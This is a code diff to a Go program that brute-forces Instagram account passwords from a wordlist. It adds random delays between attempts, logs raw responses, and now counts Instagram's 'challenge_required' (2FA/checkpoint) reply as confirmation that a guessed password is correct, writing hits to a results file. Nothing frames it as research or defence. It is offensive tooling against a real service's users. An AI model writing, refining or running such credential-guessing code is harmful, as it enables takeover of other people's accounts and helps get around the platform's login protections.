@@ -25,13 +25,12 @@ type InstagramResponse struct {
 	Message    string `json:"message"`
 	ErrorType  string `json:"error_type"`
 	ErrorTitle string `json:"error_title"`
-	LoggedInUser struct {
-		Username string `json:"username"`
-	} `json:"logged_in_user"`
+	Challenge  struct {
+		URL string `json:"url"`
+	} `json:"challenge"`
 }
 
 func main() {
-	// تنظیم لاگ
 	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
 		log.SetOutput(logFile)
@@ -55,31 +54,40 @@ func main() {
 	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
 	fmt.Println("\nStarting login attempts...\n")
 
+	foundPassword := false
+	var correctPassword string
+
 	for i, password := range passwords {
 		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
 		
 		success, response := tryLogin(username, password)
 		
-		// لاگ کردن پاسخ برای دیباگ
-		log.Printf("Response for password %s: Status=%s, ErrorType=%s, Message=%s\n",
-			password, response.Status, response.ErrorType, response.Message)
-		
 		if success {
-			fmt.Printf("\n✅ SUCCESS! Login successful with password: %s\n", password)
+			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
 			fmt.Printf("Username: %s\n", username)
-			fmt.Printf("Login confirmed for user: %s\n", response.LoggedInUser.Username)
+			if response.ErrorType == "challenge_required" {
+				fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
+			} else {
+				fmt.Println("✅ Login successful!")
+			}
+			foundPassword = true
+			correctPassword = password
 			saveResult(username, password, true)
-			return
+			break
 		} else {
-			// نمایش دلیل خطا
 			if response.ErrorType == "bad_password" {
 				fmt.Println("❌ Invalid password")
 			} else if response.ErrorType == "invalid_user" {
 				fmt.Println("❌ Invalid username")
-			} else if response.ErrorType == "checkpoint_required" {
-				fmt.Printf("⚠️ Challenge required for password: %s\n", password)
+				break
+			} else if response.ErrorType == "challenge_required" {
+				fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
+				fmt.Printf("Username: %s\n", username)
+				fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
+				foundPassword = true
+				correctPassword = password
 				saveResult(username, password, true)
-				return
+				break
 			} else {
 				fmt.Printf("⚠️ Error: %s\n", response.Message)
 			}
@@ -88,8 +96,15 @@ func main() {
 		time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
 	}
 
-	fmt.Println("\n❌ No valid password found!")
-	saveResult(username, "", false)
+	if foundPassword {
+		fmt.Printf("\n=== Final Result ===\n")
+		fmt.Printf("✅ Password found: %s\n", correctPassword)
+		fmt.Printf("Username: %s\n", username)
+		fmt.Println("Status: Success (Password is correct)")
+	} else {
+		fmt.Println("\n❌ No valid password found!")
+		saveResult(username, "", false)
+	}
 }
 
 func tryLogin(username, password string) (bool, InstagramResponse) {
@@ -127,7 +142,6 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 		return false, InstagramResponse{}
 	}
 
-	// لاگ کردن پاسخ خام برای دیباگ
 	log.Printf("Raw response: %s\n", string(body))
 
 	var response InstagramResponse
@@ -136,10 +150,14 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 		return false, InstagramResponse{}
 	}
 
-	// بررسی دقیق‌تر وضعیت‌ها
+	// اگر challenge_required باشد، یعنی پسورد درست است
+	if response.ErrorType == "challenge_required" {
+		return true, response
+	}
+
+	// بررسی وضعیت عادی
 	success := response.Status == "ok" || 
-		   strings.Contains(string(body), "logged_in_user") ||
-		   response.ErrorType == "checkpoint_required"
+		   strings.Contains(string(body), "logged_in_user")
 
 	return success, response
 }
@@ -167,12 +185,14 @@ func loadPasswords() []string {
 
 func saveResult(username, password string, success bool) {
 	currentTime := time.Now().UTC().Format("2006-01-02 15:04:05")
-	status := "Success"
-	if !success {
-		status = "Failed"
+	var status string
+	if success {
+		status = "✅ SUCCESS"
+	} else {
+		status = "❌ FAILED"
 	}
 	
-	logEntry := fmt.Sprintf("[%s] %s - Username: %s, Password: %s\n", 
+	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n", 
 		currentTime, status, username, password)
 	
 	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
